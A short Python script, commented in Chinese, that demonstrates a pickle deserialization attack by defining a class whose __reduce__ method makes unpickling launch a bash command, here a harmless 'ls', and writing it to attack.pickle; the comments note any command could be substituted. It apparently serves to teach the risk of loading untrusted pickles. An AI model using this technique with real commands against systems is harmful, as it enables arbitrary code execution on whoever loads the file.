"""
    構建攻擊的程式
    這邊以執行一個無害的 ls 為例
    但是實際上可以透過 shell 來執行任何指令了
"""

import pickle
import subprocess

class Attack:
    def __reduce__(self):
        """用來記錄復原物件時候要執行的程式"""
        return (subprocess.Popen, (('/bin/bash', '-c', 'ls'),))
    
d = Attack()

with open('attack.pickle', 'wb') as f:
    pickle.dump(d, f)